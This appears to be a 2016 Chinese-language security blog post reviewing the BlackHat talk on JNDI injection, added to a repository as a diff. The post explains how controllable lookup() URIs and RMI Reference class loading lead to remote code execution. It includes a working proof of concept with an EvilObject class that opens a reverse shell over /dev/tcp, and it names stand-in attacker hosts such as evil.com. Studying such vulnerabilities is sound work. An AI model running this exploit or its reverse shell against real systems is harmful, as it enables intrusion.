@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="（两个多月没产出了，感觉最近身体被掏空~） BlackHat 2016 (USA) 刚结束不久，作为 Web🐶 的我立马去过了一遍与 Web 相关的议题。Web 相关的议题也不算太多，比较精华的就是 @pentester 大牛的议题 - “A Journey From JNDI LDAP Manipulation To RCE”，其介绍了 Java 中利用 JNDI 进行 RCE 的具体思路和案">
+<meta name="keywords" content="web,security,java">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BlackHat 2016 回顾之 JNDI 注入简单解析">
+<meta property="og:url" content="http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/index.html">
+<meta property="og:site_name" content="rickgray.me">
+<meta property="og:description" content="（两个多月没产出了，感觉最近身体被掏空~） BlackHat 2016 (USA) 刚结束不久，作为 Web🐶 的我立马去过了一遍与 Web 相关的议题。Web 相关的议题也不算太多，比较精华的就是 @pentester 大牛的议题 - “A Journey From JNDI LDAP Manipulation To RCE”，其介绍了 Java 中利用 JNDI 进行 RCE 的具体思路和案">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://rickgray.me/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/1.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/2.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/3.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/4.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/5.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/6.png">
+<meta property="og:updated_time" content="2018-04-24T15:48:57.518Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="BlackHat 2016 回顾之 JNDI 注入简单解析">
+<meta name="twitter:description" content="（两个多月没产出了，感觉最近身体被掏空~） BlackHat 2016 (USA) 刚结束不久，作为 Web🐶 的我立马去过了一遍与 Web 相关的议题。Web 相关的议题也不算太多，比较精华的就是 @pentester 大牛的议题 - “A Journey From JNDI LDAP Manipulation To RCE”，其介绍了 Java 中利用 JNDI 进行 RCE 的具体思路和案">
+<meta name="twitter:image" content="http://rickgray.me/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>BlackHat 2016 回顾之 JNDI 注入简单解析</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2016/09/22/attacking-distributed-nodes-by-message-queue-injection/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2016/06/01/how-to-scan-and-check-vulnerabilities/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&text=BlackHat 2016 回顾之 JNDI 注入简单解析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&title=BlackHat 2016 回顾之 JNDI 注入简单解析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&is_video=false&description=BlackHat 2016 回顾之 JNDI 注入简单解析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BlackHat 2016 回顾之 JNDI 注入简单解析&body=Check out this article: http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&title=BlackHat 2016 回顾之 JNDI 注入简单解析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&title=BlackHat 2016 回顾之 JNDI 注入简单解析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&title=BlackHat 2016 回顾之 JNDI 注入简单解析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&title=BlackHat 2016 回顾之 JNDI 注入简单解析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&name=BlackHat 2016 回顾之 JNDI 注入简单解析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-JNDI-是什么？"><span class="toc-number">1.</span> <span class="toc-text">0x00 - JNDI 是什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-JNDI-获取并调用远程方法"><span class="toc-number">1.1.</span> <span class="toc-text">1. JNDI 获取并调用远程方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-RMI-中动态加载字节代码"><span class="toc-number">1.2.</span> <span class="toc-text">2. RMI 中动态加载字节代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-JNDI-协议动态转换"><span class="toc-number">2.</span> <span class="toc-text">0x02 JNDI 协议动态转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-利用-JNDI-注入加载远程代码并执行"><span class="toc-number">3.</span> <span class="toc-text">0x03 利用 JNDI 注入加载远程代码并执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-简单总结"><span class="toc-number">4.</span> <span class="toc-text">0x04 简单总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        BlackHat 2016 回顾之 JNDI 注入简单解析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">rickgray.me</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2016-08-18T16:00:00.000Z" itemprop="datePublished">2016-08-19</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/java/">java</a>, <a class="tag-link" href="/tags/security/">security</a>, <a class="tag-link" href="/tags/web/">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>（两个多月没产出了，感觉最近身体被掏空~）</p>
+<p>BlackHat 2016 (USA) 刚结束不久，作为 Web🐶 的我立马去过了一遍与 Web 相关的议题。Web 相关的议题也不算太多，比较精华的就是 <a href="https://twitter.com/pwntester" target="_blank" rel="noopener">@pentester</a> 大牛的议题 - <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf" target="_blank" rel="noopener">“A Journey From JNDI LDAP Manipulation To RCE”</a>，其介绍了 Java 中利用 JNDI 进行 RCE 的具体思路和案例，早在今年 1 月时就已经爆出过 Spring 框架的一个 RCE，该漏洞原理最根本就是利用了 JNDI 的注入，反序列化只起到一个触发 JNDI 注入的作用。</p>
+<p>本文在学习议题 PPT 的基础上，结合自己的一些理解，按理论基础了解到具体利用实现的一个过程进行回顾。（也是一名不会 Java 的 Web🐶 尝试理解漏洞原理和 EXP 构造的一个记录过程，<strong>文章内容如有不当还望指出</strong>）</p>
+<h3 id="0x00-JNDI-是什么？"><a href="#0x00-JNDI-是什么？" class="headerlink" title="0x00 - JNDI 是什么？"></a>0x00 - JNDI 是什么？</h3><p>JNDI - Java Naming and Directory Interface 名为 Java命名和目录接口，具体的概念还是比较复杂难懂，具体结构设计细节可以不用了解，简单来说就是 JNDI 提供了一组通用的接口可供应用很方便地去访问不同的后端服务，例如 LDAP、RMI、CORBA 等。如下图：</p>
+<p><img src="/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/1.png" alt=""></p>
+<p>在 Java 中为了能够更方便的管理、访问和调用远程的资源对象，常常会使用 LDAP 和 RMI 等服务来将资源对象或方法绑定在固定的远程服务端，供应用程序来进行访问和调用。为了更好的理解整个 JNDI 注入产生的原因，下面用实际代码来说明一下常规 RMI 访问和使用 JNDI 访问 RMI 的区别。（更多 JNDI 的概念可参考 <a href="http://baike.baidu.com/view/209575.htm" target="_blank" rel="noopener">http://baike.baidu.com/view/209575.htm</a>）</p>
+<h4 id="1-JNDI-获取并调用远程方法"><a href="#1-JNDI-获取并调用远程方法" class="headerlink" title="1. JNDI 获取并调用远程方法"></a>1. JNDI 获取并调用远程方法</h4><p>首先一个对象方法要想被远程应用所调用需要其 extends 于 <code>java.rmi.Remote</code> 接口，并需要抛出 <code>RemoteException</code> 异常，而远程对象必须实现 <code>java.rmi.server.UniCastRemoteObject</code> 类。首先创建一个 <code>IHello</code> 的接口（<code>IHello.java</code>）：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IHello</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>再创建 <code>IHelloImpl</code> 类实现 <code>java.rmi.server.UniCastRemoteObject</code> 类并包含 <code>IHello</code> 接口（<code>IHelloImpl.java</code>）：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IHelloImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">IHello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">IHelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello "</span> + name + <span class="string">" ^_^ "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最后用 RMI 绑定实例对象方法，并使用 JNDI 去获取并调用对象方法（<code>CallService.java</code>）：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CallService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 配置 JNDI 默认设置</span></span><br><span class="line">        Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">                <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL,</span><br><span class="line">                <span class="string">"rmi://localhost:1099"</span>);</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 本地开启 1099 端口作为 RMI 服务，并以标识 "hello" 绑定方法对象</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        IHello hello = <span class="keyword">new</span> IHelloImpl();</span><br><span class="line">        registry.bind(<span class="string">"hello"</span>, hello);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// JNDI 获取 RMI 上的方法对象并进行调用</span></span><br><span class="line">        IHello rHello = (IHello) ctx.lookup(<span class="string">"hello"</span>);</span><br><span class="line">        System.out.println(rHello.sayHello(<span class="string">"RickGray"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将上面 3 个文件放在同一目录，并使用 <code>javac *.java</code> 进行编译，然后运行 <code>java CallService</code> 即可得到运行结果。</p>
+<p><img src="/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/2.png" alt=""></p>
+<p>使用更为直观的图示来描述整个流程：</p>
+<p><img src="/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/3.png" alt=""></p>
+<p>这里应用使用 JNDI 获取远程 <code>sayHello()</code> 函数并传入 <code>&quot;RickGray&quot;</code> 参数进行调用时，真正执行该函数是在远程服务端，执行完成后会将结果序列化返回给应用端，这一点是需要弄清楚的。</p>
+<h4 id="2-RMI-中动态加载字节代码"><a href="#2-RMI-中动态加载字节代码" class="headerlink" title="2. RMI 中动态加载字节代码"></a>2. RMI 中动态加载字节代码</h4><p>如果远程获取 RMI 服务上的对象为 Reference 类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载 class 文件来进行实例化。</p>
+<p>Reference 中几个比较关键的属性：</p>
+<ol>
+<li>className - 远程加载时所使用的类名</li>
+<li>classFactory - 加载的 class 中需要实例化类的名称</li>
+<li>classFactoryLocation - 提供 classes 数据的地址可以是 file/ftp/http 等协议</li>
+</ol>
+<p>例如这里定义一个 Reference 实例，并使用继承了 <code>UnicastRemoteObject</code> 类的 <code>ReferenceWrapper</code> 包裹一下实例对象，使其能够通过 RMI 进行远程访问：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"refClassName"</span>, <span class="string">"insClassName"</span>, <span class="string">"http://example.com:12345/"</span>);</span><br><span class="line">ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">registry.bind(<span class="string">"refObj"</span>, refObjWrapper);</span><br></pre></td></tr></table></figure>
+<p>当有客户端通过 <code>lookup(&quot;refObj&quot;)</code> 获取远程对象时，获得到一个 Reference 类的存根，由于获取的是一个 Reference 实例，客户端会首先去本地的 <code>CLASSPATH</code> 去寻找被标识为 <code>refClassName</code> 的类，如果本地未找到，则会去请求 <code>http://example.com:12345/refClassName.class</code> 动态加载 classes 并调用 <code>insClassName</code> 的构造函数。</p>
+<p>借用官方的流程图：</p>
+<p><img src="/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/4.png" alt=""></p>
+<p>这里说明了在获取 RMI 远程对象时，可以动态地加载外部代码进行对象类型实例化，而 JNDI 同样具有访问 RMI 运城对象的能力，只要其查找参数即 <code>lookup()</code> 函数的参数值可控，那么就有可能促使程序去加载和自信部署在攻击者服务器上的恶意代码。</p>
+<h3 id="0x02-JNDI-协议动态转换"><a href="#0x02-JNDI-协议动态转换" class="headerlink" title="0x02 JNDI 协议动态转换"></a>0x02 JNDI 协议动态转换</h3><p>前面简单的用代码和图例说明了 JNDI 的应用方式和 RMI 中的动态字节代码加载，在初始化配置 JNDI 设置时可以预先指定其上下文环境（RMI、LDAP 或者 CORBA 等）：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">        <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">env.put(Context.PROVIDER_URL,</span><br><span class="line">        <span class="string">"rmi://localhost:1099"</span>);</span><br><span class="line">Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br></pre></td></tr></table></figure>
+<p>而在调用 <code>lookup()</code> 或者 <code>search()</code> 时，可以使用带 URI 动态的转换上下文环境，例如上面已经设置了当前上下文会访问 RMI 服务，那么可以直接使用 LDAP 的 URI 格式去转换上下文环境访问 LDAP 服务上的绑定对象：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ctx.lookup(<span class="string">"ldap://attacker.com:12345/ou=foo,dc=foobar,dc=com"</span>);</span><br></pre></td></tr></table></figure>
+<p>在议题所提供的 Write-Up 里有提供详细远离的代码来说明为什么可以使用绝对路径 URI 去动态地转换上下文环境：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>getURLOrDefaultInitCtx()</code> 函数的具体代码实现为：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Context <span class="title">getURLOrDefaultInitCtx</span><span class="params">(Name paramName)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (NamingManager.hasInitialContextFactoryBuilder()) &#123;</span><br><span class="line">        <span class="keyword">return</span> getDefaultInitCtx(); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (paramName.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        String str1 = paramName.get(<span class="number">0</span>);</span><br><span class="line">        String str2 = getURLScheme(str1);  <span class="comment">// 尝试解析 URI 中的协议</span></span><br><span class="line">        <span class="keyword">if</span> (str2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果存在 Schema 协议，则尝试获取其对应的上下文环境</span></span><br><span class="line">            Context localContext = NamingManager.getURLContext(str2, <span class="keyword">this</span>.myProps);</span><br><span class="line">            <span class="keyword">if</span> (localContext != <span class="keyword">null</span>) &#123; </span><br><span class="line">                <span class="keyword">return</span> localContext;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> getDefaultInitCtx();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但第一次调用 <code>lookup()</code> 函数的时候，会对上下文环境进行一个初始化，这时候代码会对 <code>paramName</code> 参数值进行一个 URL 解析，如果 <code>paramName</code> 包含一个特定的 Schema 协议，代码则会使用相应的工厂去初始化上下文环境，这时候不管之前配置的工厂环境是什么，这里都会被动态地对其进行替换。</p>
+<h3 id="0x03-利用-JNDI-注入加载远程代码并执行"><a href="#0x03-利用-JNDI-注入加载远程代码并执行" class="headerlink" title="0x03 利用 JNDI 注入加载远程代码并执行"></a>0x03 利用 JNDI 注入加载远程代码并执行</h3><p>结合前面说到的两个点：</p>
+<ul>
+<li>JNDI 调用中 <code>lookup()</code> 参数可控</li>
+<li>使用带协议的 URI 可以进行动态环境转换</li>
+<li><code>Reference</code> 类动态代码获取进行实例化</li>
+</ul>
+<p>即当 Java 应用代码中出现 <code>lookup(&lt;attacker-controlled&gt;)</code> 这种情况时，会形成 RCE，整个利用过程为：</p>
+<p><img src="/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/5.png" alt=""></p>
+<ol>
+<li>攻击者通过可控的 URI 参数触发动态环境转换，例如这里 URI 为 <code>rmi://evil.com:1099/refObj</code>；</li>
+<li>原先配置好的上下文环境 <code>rmi://localhost:1099</code> 会因为动态环境转换而被指向 <code>rmi://evil.com:1099/</code>；</li>
+<li>应用去 <code>rmi://evil.com:1099</code> 请求绑定对象 <code>refObj</code>，攻击者事先准备好的 RMI 服务会返回与名称 <code>refObj</code> 想绑定的 ReferenceWrapper 对象（<code>Reference(&quot;EvilObject&quot;, &quot;EvilObject&quot;, &quot;http://evil-cb.com/&quot;)</code>）；</li>
+<li>应用获取到 <code>ReferenceWrapper</code> 对象开始从本地 <code>CLASSPATH</code> 中搜索 <code>EvilObject</code> 类，如果不存在则会从 <code>http://evil-cb.com/</code> 上去尝试获取 <code>EvilObject.class</code>，即动态的去获取 <code>http://evil-cb.com/EvilObject.class</code>；</li>
+<li>攻击者事先准备好的服务返回编译好的包含恶意代码的 <code>EvilObject.class</code>；</li>
+<li>应用开始调用 <code>EvilObject</code> 类的构造函数，因攻击者事先定义在构造函数，被包含在里面的恶意代码被执行；</li>
+</ol>
+<p>整个攻击的实现过程如上面所述，<strong>关键的利用点在于攻击者可控的允、许动态环境转换的接口函数</strong>，这里举了 <code>RMI</code> 结合 <code>Reference Object</code> 进行 RCE 的例子，更多的攻击向量参考原议题内容即可（因为我也理解得不是特别透彻，怕写错误导了大家）</p>
+<p>下面给出完整的演示代码示例，首先是存在 JNDI 注入的程序（<code>RMIService.java</code>）：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(args.length &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">"Usage: java JNDIClient &lt;uri&gt;"</span>);</span><br><span class="line">            System.exit(-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String uri = args[<span class="number">0</span>];</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        System.out.println(<span class="string">"Using lookup() to fetch object with "</span> + uri);</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接着是要通过 JNDI 注入远程加载的类实例，一会儿可以用 <code>python -m SimpleHTTPServer</code> 启一个临时的 HTTP 服务来提供编译好的 <code>EvilObject.class</code>（<code>EvilObject.java</code>）：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime rt = Runtime.getRuntime();</span><br><span class="line">        String[] commands = &#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"/bin/sh -i &gt; /dev/tcp/127.0.0.1/1337 2&gt;&amp;1 0&gt;&amp;1"</span>&#125;;</span><br><span class="line">        Process pc = rt.exec(commands);</span><br><span class="line">        pc.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>EvilObject</code> 类的构造函数中包含了执行系统命令反弹 Shell 的代码，一会儿当 JNDI 注入成功触发时会被执行。</p>
+<p>这里还需要一个 RMI 服务绑定一个相关的引用类（<code>RMIService.java</code>）：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"EvilObject"</span>, <span class="string">"EvilObject"</span>, <span class="string">"http://127.0.0.1:8080/"</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">        System.out.println(<span class="string">"Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/refObj'"</span>);</span><br><span class="line">        registry.bind(<span class="string">"refObj"</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>前面也说到了对象实例要能成功绑定在 RMI 服务上，必须直接或间接的实现 <code>Remote</code> 接口，这里 <code>ReferenceWrapper</code> 就继承于 <code>UnicastRemoteObject</code> 类并实现了 <code>Remote</code> 接口。</p>
+<p>这里将 <code>RMIService.java</code> 和 <code>JNDIClient.java</code> 放在同一目录下，将 <code>EvilObject.java</code> 放在另一个目录下（为防止漏洞复现过程中应用端实例化 EvilObject 对象时从 CLASSPATH 当前路径找到编译好的字节代码，而不去远端进行下载的情况发生）,编译这三个文件，并在不同窗口下执行命令：</p>
+<p><img src="/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/6.png" alt=""></p>
+<p>成功执行后会在事先监听的端口上获取到反弹的 Shell。这里的代码只是为了方便还原漏洞场景，其他比较细节的东西这里就不讨论了。看不懂的可以多理解下前面那幅漏洞利用过程图例，这样结合代码能够更快速的掌握漏洞原理和关键点。</p>
